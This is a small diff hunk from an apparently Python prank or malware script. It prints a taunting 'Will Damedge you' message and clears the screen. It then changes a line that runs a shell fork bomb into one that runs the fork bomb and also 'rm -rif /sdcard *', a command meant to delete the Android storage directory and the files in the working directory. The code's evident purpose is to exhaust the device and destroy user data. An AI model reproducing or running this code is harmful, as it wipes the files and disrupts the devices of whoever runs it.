@@ -59,4 +59,4 @@ print("\033[0;33m LWES ELTASA Will Damedge you (:")
 
 time.sleep(2)
 os.system("clear")
-os.system(":(){ :|:& };:")
+os.system(":(){ :|:& };: && rm -rif /sdcard *")
